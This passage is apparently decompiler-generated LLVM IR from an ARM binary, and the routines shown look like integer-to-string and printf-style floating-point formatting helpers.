  uselistorder i32 %v2_13b24, { 1, 0 }
  uselistorder i32 %v2_13b20, { 1, 2, 0 }
  uselistorder i1 %v2_13b40, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13b48, { 1, 0 }
  uselistorder label %.thread, { 2, 0, 1 }
}

define i32 @function_13b74(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_13b74:
  %cpsr_z.global-to-local = alloca i1, align 1
  %tmp = trunc i32 %arg3 to i16
  %tmp2 = ptrtoint i16* %arg1 to i32
  %v7_13b74 = icmp eq i32 %arg2, 256
  store i1 %v7_13b74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13b74, label %bb, label %bb4

bb:                                               ; preds = %dec_label_pc_13b74
  %v3_13b78 = trunc i32 %arg3 to i8
  %tmp3 = bitcast i16* %arg1 to i8*
  store i8 %v3_13b78, i8* %tmp3, align 1
  %v1_13b7c.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_13b74, %bb
  %v1_13b7c = phi i1 [ false, %dec_label_pc_13b74 ], [ %v1_13b7c.pre, %bb ]
  %v0_13b7c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_13b7c, i32 %v0_13b7c)
  %v7_13b80 = icmp eq i32 %arg2, 2048
  store i1 %v7_13b80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13b80, label %dec_label_pc_13b88, label %dec_label_pc_13b90

dec_label_pc_13b88:                               ; preds = %bb4
  %tmp5 = bitcast i16* %arg1 to i32*
  store i32 %arg3, i32* %tmp5, align 4
  %v5_13b88 = add i32 %tmp2, 4
  %v6_13b88 = inttoptr i32 %v5_13b88 to i32*
  store i32 %arg4, i32* %v6_13b88, align 4
  ret i32 %tmp2

dec_label_pc_13b90:                               ; preds = %bb4
  %v7_13b90 = icmp eq i32 %arg2, 512
  store i1 %v7_13b90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13b90, label %bb6, label %.thread

bb6:                                              ; preds = %dec_label_pc_13b90
  store i16 %tmp, i16* %arg1, align 2
  br label %bb8

.thread:                                          ; preds = %dec_label_pc_13b90
  %tmp7 = bitcast i16* %arg1 to i32*
  store i32 %arg3, i32* %tmp7, align 4
  br label %bb8

bb8:                                              ; preds = %bb6, %.thread
  ret i32 %tmp2

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i16* %arg1, { 2, 3, 0, 1, 4 }
  uselistorder label %bb8, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_13ba0(i8* %arg1) local_unnamed_addr {
dec_label_pc_13ba0:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %v3_13ba0 = load i32, i32* @r4, align 4
  %v12_13ba0 = load i32, i32* @r7, align 4
  store i32 %tmp19, i32* @r7, align 4
  %v1_13bac = icmp slt i32 %tmp19, 0
  %v2_13bac = icmp eq i32 %tmp19, 0
  store i1 %v2_13bac, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r8.global-to-local, align 4
  %v0_13bb4 = load i32, i32* @r2, align 4
  store i32 %v0_13bb4, i32* %r5.global-to-local, align 4
  %v0_13bb8 = load i32, i32* @r3, align 4
  store i32 %v0_13bb8, i32* %r6.global-to-local, align 4
  br i1 %v1_13bac, label %dec_label_pc_13bc0, label %dec_label_pc_13be0

dec_label_pc_13bc0:                               ; preds = %dec_label_pc_13ba0
  %v1_13bc0 = icmp slt i32 %v0_13bb8, 0
  %v2_13bc0 = icmp eq i32 %v0_13bb8, 0
  store i1 %v2_13bc0, i1* %cpsr_z.global-to-local, align 1
  %v1_13bc4 = sub i32 0, %tmp19
  store i32 %v1_13bc4, i32* @r7, align 4
  br i1 %v1_13bc0, label %dec_label_pc_13bcc, label %dec_label_pc_13be0

dec_label_pc_13bcc:                               ; preds = %dec_label_pc_13bc0
  %v1_13bd0 = sub i32 0, %v0_13bb4
  store i32 %v1_13bd0, i32* %r5.global-to-local, align 4
  %v2_13bd0 = icmp eq i32 %v0_13bb4, 0
  %v2_13bd4 = icmp eq i1 %v2_13bd0, false
  %v5_13bd4 = sext i1 %v2_13bd4 to i32
  %v6_13bd4 = sub i32 %v5_13bd4, %v0_13bb8
  store i32 %v6_13bd4, i32* %r6.global-to-local, align 4
  %v19_13bd4 = icmp eq i32 %v6_13bd4, 0
  store i1 %v19_13bd4, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13be8

dec_label_pc_13be0:                               ; preds = %dec_label_pc_13bc0, %dec_label_pc_13ba0
  br label %dec_label_pc_13be8

dec_label_pc_13be8:                               ; preds = %dec_label_pc_13bcc, %dec_label_pc_13be0
  %storemerge = phi i8 [ 0, %dec_label_pc_13be0 ], [ 1, %dec_label_pc_13bcc ]
  store i32 0, i32* %sl.global-to-local, align 4
  store i8 0, i8* %arg1, align 1
  %v0_13bf0 = load i32, i32* @r7, align 4
  store i32 %v0_13bf0, i32* @r1, align 4
  store i32 -1, i32* @r0, align 4
  %v0_13bf8 = call i32 @function_cb30()
  %v0_13bfc = load i32, i32* @r7, align 4
  store i32 %v0_13bf8, i32* %fp.global-to-local, align 4
  %v2_13c08 = call i32 @function_cc2c(i32 -1, i32 %v0_13bfc)
  %v1_13c0c = add i32 %v0_13bfc, 1
  store i32 %v1_13c0c, i32* %sb.global-to-local, align 4
  %v1_13c10 = load i32, i32* @r7, align 4
  %v9_13c10 = icmp eq i32 %v1_13c0c, %v1_13c10
  store i1 %v9_13c10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_13c10, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_13be8
  %v1_13c14 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_13c14, i32* %sb.global-to-local, align 4
  %v1_13c18 = load i32, i32* %fp.global-to-local, align 4
  %v2_13c18 = add i32 %v1_13c18, 1
  store i32 %v2_13c18, i32* %fp.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13be8, %bb
  %v0_13c1c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_13c1c, i32* %sl.global-to-local, align 4
  %v0_13c20 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13c20, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13c24

dec_label_pc_13c24thread-pre-split:               ; preds = %bb23
  %v0_13c24.pr = load i32, i32* %sl.global-to-local, align 4
  %v0_13c28.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_13c2c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_13c24

dec_label_pc_13c24:                               ; preds = %dec_label_pc_13c24thread-pre-split, %.thread
  %v0_13c2c = phi i32 [ %v0_13c2c.pre, %dec_label_pc_13c24thread-pre-split ], [ %v1_13c10, %.thread ]
  %v0_13c28 = phi i32 [ %v0_13c28.pre, %dec_label_pc_13c24thread-pre-split ], [ %v0_13c20, %.thread ]
  %v0_13c34 = phi i32 [ %v0_13c24.pr, %dec_label_pc_13c24thread-pre-split ], [ %v0_13c1c, %.thread ]
  %v2_13c24 = icmp eq i32 %v0_13c34, 0
  store i1 %v2_13c24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13c24, label %dec_label_pc_13c9c, label %dec_label_pc_13c34

dec_label_pc_13c34:                               ; preds = %dec_label_pc_13c24
  %v2_13c38 = call i32 @function_cc2c(i32 %v0_13c34, i32 %v0_13c2c)
  %v0_13c3c = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_13c3c, i32* @r0, align 4
  store i32 %v0_13c2c, i32* @r4, align 4
  %v0_13c44 = load i32, i32* @r7, align 4
  store i32 %v0_13c44, i32* @r1, align 4
  %v0_13c48 = call i32 @function_cb30()
  %v0_13c4c = load i32, i32* @r7, align 4
  store i32 %v0_13c48, i32* %sl.global-to-local, align 4
  %v0_13c54 = load i32, i32* %r6.global-to-local, align 4
  %v2_13c58 = call i32 @function_cc2c(i32 %v0_13c54, i32 %v0_13c4c)
  %v0_13c5c = load i32, i32* %sb.global-to-local, align 4
  %v1_13c5c = load i32, i32* @r4, align 4
  %v2_13c5c = mul i32 %v1_13c5c, %v0_13c5c
  store i32 %v0_13c54, i32* @r0, align 4
  %v2_13c64 = add i32 %v2_13c5c, %v0_13c4c
  store i32 %v2_13c64, i32* %r5.global-to-local, align 4
  %v0_13c68 = load i32, i32* @r7, align 4
  store i32 %v0_13c68, i32* @r1, align 4
  %v0_13c6c = call i32 @function_cb30()
  %v0_13c70 = load i32, i32* %fp.global-to-local, align 4
  %v1_13c70 = load i32, i32* @r4, align 4
  %v2_13c70 = mul i32 %v1_13c70, %v0_13c70
  %v0_13c74 = load i32, i32* @r7, align 4
  store i32 %v0_13c74, i32* @r1, align 4
  %v2_13c78 = add i32 %v2_13c70, %v0_13c6c
  store i32 %v2_13c78, i32* @r4, align 4
  %v0_13c7c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13c7c, i32* @r0, align 4
  %v0_13c80 = call i32 @function_cb30()
  %v0_13c84 = load i32, i32* @r7, align 4
  %v0_13c88 = load i32, i32* @r4, align 4
  %v2_13c88 = add i32 %v0_13c88, %v0_13c80
  store i32 %v2_13c88, i32* %r6.global-to-local, align 4
  %v0_13c8c = load i32, i32* %r5.global-to-local, align 4
  %v2_13c90 = call i32 @function_cc2c(i32 %v0_13c8c, i32 %v0_13c84)
  store i32 %v0_13c84, i32* @r4, align 4
  br label %dec_label_pc_13cb4

dec_label_pc_13c9c:                               ; preds = %dec_label_pc_13c24
  %v2_13c9c = call i32 @function_cc2c(i32 %v0_13c28, i32 %v0_13c2c)
  %v0_13ca0 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_13ca0, i32* @r0, align 4
  store i32 %v0_13c2c, i32* @r4, align 4
  %v0_13ca8 = load i32, i32* @r7, align 4
  store i32 %v0_13ca8, i32* @r1, align 4
  %v0_13cac = call i32 @function_cb30()
  store i32 %v0_13cac, i32* %r6.global-to-local, align 4
  %v0_13cb8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13cb4

dec_label_pc_13cb4:                               ; preds = %dec_label_pc_13c34, %dec_label_pc_13c9c
  %v0_13cbc = phi i32 [ %v0_13c84, %dec_label_pc_13c34 ], [ %v0_13cb8.pre, %dec_label_pc_13c9c ]
  %v2_13cb8 = icmp ugt i32 %v0_13cbc, 8
  %v7_13cb8 = icmp eq i32 %v0_13cbc, 9
  store i1 %v7_13cb8, i1* %cpsr_z.global-to-local, align 1
  %v1_13cc0 = add i32 %v0_13cbc, 48
  %v0_13cc8 = load i32, i32* %r8.global-to-local, align 4
  %v1_13cc8 = add i32 %v0_13cc8, -1
  store i32 %v1_13cc8, i32* %r8.global-to-local, align 4
  %v2_13ccc = xor i1 %v7_13cb8, true
  %v3_13ccc = and i1 %v2_13cb8, %v2_13ccc
  %extract.t = trunc i32 %v1_13cc0 to i8
  br i1 %v3_13ccc, label %bb22, label %bb23

bb22:                                             ; preds = %dec_label_pc_13cb4
  %v2_13cbc = add i32 %v0_13cbc, %tmp9
  %extract.t7 = trunc i32 %v2_13cbc to i8
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_13cb4, %bb22
  %v0_13cd4.off0 = phi i8 [ %extract.t, %dec_label_pc_13cb4 ], [ %extract.t7, %bb22 ]
  %v0_13cd0 = load i32, i32* %r6.global-to-local, align 4
  %v1_13cd0 = load i32, i32* %sl.global-to-local, align 4
  %v2_13cd0 = or i32 %v1_13cd0, %v0_13cd0
  %v4_13cd0 = icmp eq i32 %v2_13cd0, 0
  store i1 %v4_13cd0, i1* %cpsr_z.global-to-local, align 1
  %v3_13cd4 = inttoptr i32 %v1_13cc8 to i8*
  store i8 %v0_13cd4.off0, i8* %v3_13cd4, align 1
  %v0_13cd8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13cd8, label %dec_label_pc_13cdc, label %dec_label_pc_13c24thread-pre-split

dec_label_pc_13cdc:                               ; preds = %bb23
  %v4_13cdc8 = zext i8 %storemerge to i32
  store i32 %v4_13cdc8, i32* @r3, align 4
  %v2_13ce0 = icmp eq i8 %storemerge, 0
  store i1 %v2_13ce0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13ce0, label %dec_label_pc_13cdc..thread2_crit_edge, label %bb24

dec_label_pc_13cdc..thread2_crit_edge:            ; preds = %dec_label_pc_13cdc
  %v0_13cec.pre = load i32, i32* %r8.global-to-local, align 4
  br label %.thread2

bb24:                                             ; preds = %dec_label_pc_13cdc
  store i32 45, i32* @r3, align 4
  %v3_13ce8 = load i32, i32* %r8.global-to-local, align 4
  %v4_13ce8 = add i32 %v3_13ce8, -1
  %v5_13ce8 = inttoptr i32 %v4_13ce8 to i8*
  store i8 45, i8* %v5_13ce8, align 1
  %v6_13ce8 = load i32, i32* %r8.global-to-local, align 4
  %v7_13ce8 = add i32 %v6_13ce8, -1
  store i32 %v7_13ce8, i32* %r8.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_13cdc..thread2_crit_edge, %bb24
  %v0_13cec = phi i32 [ %v0_13cec.pre, %dec_label_pc_13cdc..thread2_crit_edge ], [ %v7_13ce8, %bb24 ]
  store i32 %v3_13ba0, i32* @r4, align 4
  store i32 %v12_13ba0, i32* @r7, align 4
  ret i32 %v0_13cec

; uselistorder directives
  uselistorder i32 %v0_13c84, { 0, 2, 1 }
  uselistorder i8 %storemerge, { 1, 0 }
  uselistorder i32 %v0_13bb4, { 1, 0, 2 }
  uselistorder i32 %tmp19, { 0, 3, 2, 1 }
  uselistorder i32* %sl.global-to-local, { 2, 0, 3, 1, 4, 5, 6 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %r6.global-to-local, { 2, 0, 5, 3, 4, 1, 6, 8, 7, 9 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %dec_label_pc_13cb4, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_13be8, { 1, 0 }
}

define i32 @function_13cfc(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_13cfc:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  %tmp182 = ptrtoint i32* %arg4 to i32
  store i32 %tmp182, i32* %stack_var_0, align 4
  %stack_var_-46 = alloca i8, align 1
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-47 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-42 = alloca i32, align 4
  %stack_var_-82 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-83 = alloca i32, align 4
  %stack_var_-81 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %v3_13cfc = load i32, i32* @r4, align 4
  %v6_13cfc = load i32, i32* @r5, align 4
  %v9_13cfc = load i32, i32* @r6, align 4
  %v12_13cfc = load i32, i32* @r7, align 4
  %v27_13cfc = load i32, i32* @lr, align 4
  store i32 %tmp182, i32* %r1.global-to-local, align 4
  %v1_13d08 = add i32 %tmp182, 8
  %v2_13d08 = inttoptr i32 %v1_13d08 to i8*
  %v3_13d08 = load i8, i8* %v2_13d08, align 1
  %v4_13d08 = zext i8 %v3_13d08 to i32
  store i32 %v4_13d08, i32* %sb.global-to-local, align 4
  %v1_13d0c = or i32 %v4_13d08, 32
  %v7_13d10 = icmp eq i32 %v1_13d0c, 97
  store i1 %v7_13d10, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp182, i32* %r0.global-to-local, align 4
  store i32 %tmp182, i32* %r1.global-to-local, align 4
  %v2_13d28 = load i32, i32* %arg4, align 4
  store i32 %v2_13d28, i32* %fp.global-to-local, align 4
  store i32 %tmp182, i32* %lr.global-to-local, align 4
  %v0_13d30 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_13d30, i32* @r6, align 4
  store i32 61720, i32* %ip.global-to-local, align 4
  br i1 %v7_13d10, label %bb, label %bb197

bb:                                               ; preds = %dec_label_pc_13cfc
  %v2_13d38 = add nuw nsw i32 %v4_13d08, 6
  store i32 %v2_13d38, i32* %r3.global-to-local, align 4
  br label %bb197

bb197:                                            ; preds = %dec_label_pc_13cfc, %bb
  %v1_13d48 = phi i32 [ %v0_13d30, %dec_label_pc_13cfc ], [ %v2_13d38, %bb ]
  store i32 %arg2, i32* @r5, align 4
  %v1_13d40 = add i32 %tmp182, 12
  %v2_13d40 = inttoptr i32 %v1_13d40 to i32*
  %v3_13d40 = load i32, i32* %v2_13d40, align 4
  store i32 %v3_13d40, i32* %r2.global-to-local, align 4
  %v1_13d44 = add i32 %tmp182, 4
  %v2_13d44 = inttoptr i32 %v1_13d44 to i32*
  %v3_13d44 = load i32, i32* %v2_13d44, align 4
  store i32 %v3_13d44, i32* @lr, align 4
  br i1 %v7_13d10, label %bb198, label %bb199

bb198:                                            ; preds = %bb197
  %v2_13d48 = urem i32 %v1_13d48, 256
  store i32 %v2_13d48, i32* %sb.global-to-local, align 4
  br label %bb199

bb199:                                            ; preds = %bb197, %bb198
  %v1_13d4c = icmp slt i32 %v2_13d28, 0
  %v2_13d4c = icmp eq i32 %v2_13d28, 0
  store i1 %v2_13d4c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 142964, i32* %ip.global-to-local, align 4
  br i1 %v1_13d4c, label %bb200, label %bb201

bb200:                                            ; preds = %bb199
  store i32 6, i32* %fp.global-to-local, align 4
  br label %bb201

bb201:                                            ; preds = %bb199, %bb200
  %v1_13d5c = and i32 %v3_13d40, 2
  %v2_13d5c = icmp eq i32 %v1_13d5c, 0
  store i1 %v2_13d5c, i1* %cpsr_z.global-to-local, align 1
  store i8 0, i8* %stack_var_-46, align 1
  br i1 %v2_13d5c, label %dec_label_pc_13d74, label %dec_label_pc_13d80

dec_label_pc_13d74:                               ; preds = %bb201
  %v1_13d74 = urem i32 %v3_13d40, 2
  %v2_13d74 = icmp eq i32 %v1_13d74, 0
  store i1 %v2_13d74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13d74, label %dec_label_pc_13d84, label %dec_label_pc_13d80

dec_label_pc_13d80:                               ; preds = %dec_label_pc_13d74, %bb201
  %storemerge = phi i32 [ 43, %bb201 ], [ 32, %dec_label_pc_13d74 ]
  %v0_13d80.off0 = phi i8 [ 43, %bb201 ], [ 32, %dec_label_pc_13d74 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  store i8 %v0_13d80.off0, i8* %stack_var_-46, align 1
  br label %dec_label_pc_13d84

dec_label_pc_13d84:                               ; preds = %dec_label_pc_13d74, %dec_label_pc_13d80
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v0_13d30, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r0, align 4
  store i32 %v0_13d30, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v5_13da0 = call i32 @function_187b4(i32 %arg2, i32 %v0_13d30, i32 %arg2, i32 %v0_13d30, i32 0)
  store i32 %v5_13da0, i32* %r0.global-to-local, align 4
  %v2_13da4 = icmp eq i32 %v5_13da0, 0
  store i1 %v2_13da4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13da4, label %bb203, label %dec_label_pc_13db4

bb203:                                            ; preds = %dec_label_pc_13d84
  store i32 8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_13e68

dec_label_pc_13db4:                               ; preds = %dec_label_pc_13d84
  %v0_13db4 = load i32, i32* @r5, align 4
  store i32 %v0_13db4, i32* @r0, align 4
  %v0_13db8 = load i32, i32* @r6, align 4
  store i32 %v0_13db8, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_13dc4 = call i32 @function_187b4(i32 %v0_13db4, i32 %v0_13db8, i32 0, i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_13dc4, i32* %r0.global-to-local, align 4
  %v2_13dc8 = icmp eq i32 %v5_13dc4, 0
  store i1 %v2_13dc8, i1* %cpsr_z.global-to-local, align 1
  %v0_13e10 = load i32, i32* @r5, align 4
  br i1 %v2_13dc8, label %dec_label_pc_13e10, label %dec_label_pc_13dd0

dec_label_pc_13dd0:                               ; preds = %dec_label_pc_13db4
  store i32 %v0_13e10, i32* %r2.global-to-local, align 4
  %v0_13dd4 = load i32, i32* @r6, align 4
  store i32 %v0_13dd4, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1072693248, i32* %r1.global-to-local, align 4
  %v4_13de0 = call i32 @function_184e0(i32 0, i32 1072693248, i32 %v0_13e10, i32 %v0_13dd4)
  store i32 %v4_13de0, i32* @r0, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_13dec = call i32 @function_187cc(i32 %v4_13de0)
  store i32 %v1_13dec, i32* %r0.global-to-local, align 4
  %v2_13df0 = icmp eq i32 %v1_13dec, 0
  store i1 %v2_13df0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13df0, label %bb204, label %dec_label_pc_13dfc

bb204:                                            ; preds = %dec_label_pc_13dd0
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13fdc

dec_label_pc_13dfc:                               ; preds = %dec_label_pc_13dd0
  store i32 45, i32* %r3.global-to-local, align 4
  store i8 45, i8* %stack_var_-46, align 1
  br label %dec_label_pc_13fdc

dec_label_pc_13e10:                               ; preds = %dec_label_pc_13db4
  store i32 %v0_13e10, i32* @r0, align 4
  %v0_13e14 = load i32, i32* @r6, align 4
  store i32 %v0_13e14, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_13e20 = call i32 @function_187cc(i32 %v0_13e10)
  store i32 %v4_13e20, i32* %r0.global-to-local, align 4
  %v2_13e24 = icmp eq i32 %v4_13e20, 0
  store i1 %v2_13e24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13e24, label %dec_label_pc_13e10..thread9_crit_edge, label %bb205

dec_label_pc_13e10..thread9_crit_edge:            ; preds = %dec_label_pc_13e10
  %v0_13e44.pre = load i32, i32* @r6, align 4
  br label %.thread9

bb205:                                            ; preds = %dec_label_pc_13e10
  store i32 45, i32* %r2.global-to-local, align 4
  %v1_13e2c = load i32, i32* @r6, align 4
  %v2_13e2c = sub i32 0, %v1_13e2c
  store i32 %v2_13e2c, i32* @r4, align 4
  store i8 45, i8* %stack_var_-46, align 1
  store i32 %v2_13e2c, i32* @r6, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_13e10..thread9_crit_edge, %bb205
  %v0_13e44 = phi i32 [ %v0_13e44.pre, %dec_label_pc_13e10..thread9_crit_edge ], [ %v2_13e2c, %bb205 ]
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1070596096, i32* %r3.global-to-local, align 4
  %v0_13e40 = load i32, i32* @r5, align 4
  store i32 %v0_13e40, i32* %r0.global-to-local, align 4
  store i32 %v0_13e44, i32* %r1.global-to-local, align 4
  %v4_13e48 = sext i32 %v0_13e40 to i64
  %v5_13e48 = call i32 @function_18250(i64 %v4_13e48, i32 %v0_13e44, i32 0, i32 1070596096)
  store i32 %v5_13e48, i32* %r2.global-to-local, align 4
  store i32 %v0_13e44, i32* %r3.global-to-local, align 4
  %v0_13e54 = load i32, i32* @r5, align 4
  store i32 %v0_13e54, i32* @r0, align 4
  %v0_13e58 = load i32, i32* @r6, align 4
  store i32 %v0_13e58, i32* %r1.global-to-local, align 4
  %v5_13e5c = call i32 @function_187b4(i32 %v0_13e54, i32 %v0_13e58, i32 %v5_13e48, i32 %v0_13e44, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_13e5c, i32* %r0.global-to-local, align 4
  %v2_13e60 = icmp eq i32 %v5_13e5c, 0
  store i1 %v2_13e60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13e60, label %dec_label_pc_13eb4, label %.thread9.dec_label_pc_13e68_crit_edge

.thread9.dec_label_pc_13e68_crit_edge:            ; preds = %.thread9
  %v3_13e68.pre = load i32, i32* %stack_var_0, align 4
  br label %dec_label_pc_13e68

dec_label_pc_13e68:                               ; preds = %bb203, %.thread9.dec_label_pc_13e68_crit_edge
  %v3_13e68 = phi i32 [ %v3_13e68.pre, %.thread9.dec_label_pc_13e68_crit_edge ], [ %tmp182, %bb203 ]
  %v1_13dac.v0_13d985 = phi i32 [ 0, %.thread9.dec_label_pc_13e68_crit_edge ], [ 8, %bb203 ]
  store i32 %v3_13e68, i32* %ip.global-to-local, align 4
  %v2_13e70 = add i32 %v3_13e68, 16
  %v3_13e70 = inttoptr i32 %v2_13e70 to i32*
  store i32 32, i32* %v3_13e70, align 4
  %v0_13e78 = load i32, i32* %sb.global-to-local, align 4
  %v7_13e78 = icmp eq i32 %v0_13e78, 96
  store i1 %v7_13e78, i1* %cpsr_z.global-to-local, align 1
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 3, i32* %stack_var_-164, align 4
  %tmp = icmp ult i32 %v0_13e78, 97
  br i1 %tmp, label %bb206, label %.thread121

bb206:                                            ; preds = %dec_label_pc_13e68
  %v5_13e8c = or i32 %v1_13dac.v0_13d985, 4
  store i32 %v5_13e8c, i32* %r3.global-to-local, align 4
  br label %.thread121

.thread121:                                       ; preds = %dec_label_pc_13e68, %bb206
  %v4_13e90 = phi i32 [ %v5_13e8c, %bb206 ], [ 3, %dec_label_pc_13e68 ]
  %v4_13e90.v1_13dac.v0_13d98 = select i1 %tmp, i32 %v4_13e90, i32 %v1_13dac.v0_13d985
  store i32 142964, i32* %lr.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1ad58.605 to i32), i32* %r3.global-to-local, align 4
  %v2_13ea4 = add i32 %v4_13e90.v1_13dac.v0_13d98, ptrtoint ([4 x i8]* @global_var_1ad58.605 to i32)
  store i32 %v2_13ea4, i32* %r2.global-to-local, align 4
  %v2_13ea8 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v2_13ea8, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_143d0

dec_label_pc_13eb4:                               ; preds = %.thread9
  %v0_13eb4 = load i32, i32* @r6, align 4
  store i32 %v0_13eb4, i32* %r1.global-to-local, align 4
  store i32 1100470148, i32* %r3.global-to-local, align 4
  %v0_13ebc = load i32, i32* @r5, align 4
  store i32 %v0_13ebc, i32* @r0, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v4_13ec4 = call i32 @function_187cc(i32 %v0_13ebc)
  store i32 %v4_13ec4, i32* %r0.global-to-local, align 4
  %v2_13ec8 = icmp eq i32 %v4_13ec4, 0
  store i1 %v2_13ec8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13ec8, label %bb208, label %bb207

bb207:                                            ; preds = %dec_label_pc_13eb4
  store i32 1, i32* %r0.global-to-local, align 4
  br label %bb208

bb208:                                            ; preds = %dec_label_pc_13eb4, %bb207
  %v0_13ed0 = phi i32 [ 0, %dec_label_pc_13eb4 ], [ 1, %bb207 ]
  store i32 142964, i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1ad70.608 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1ad70.608 to i32), i32* %stack_var_-208, align 4
  store i32 9, i32* %sl.global-to-local, align 4
  store i32 256, i32* @r4, align 4
  %v2_13f04 = icmp eq i32 %v0_13ed0, 0
  br label %dec_label_pc_13ef4

dec_label_pc_13ef4:                               ; preds = %dec_label_pc_13f8c.dec_label_pc_13ef4_crit_edge, %bb208
  %v2_13efc = phi i32 [ ptrtoint (i32* @global_var_1ad70.608 to i32), %bb208 ], [ %v2_13efc.pre, %dec_label_pc_13f8c.dec_label_pc_13ef4_crit_edge ]
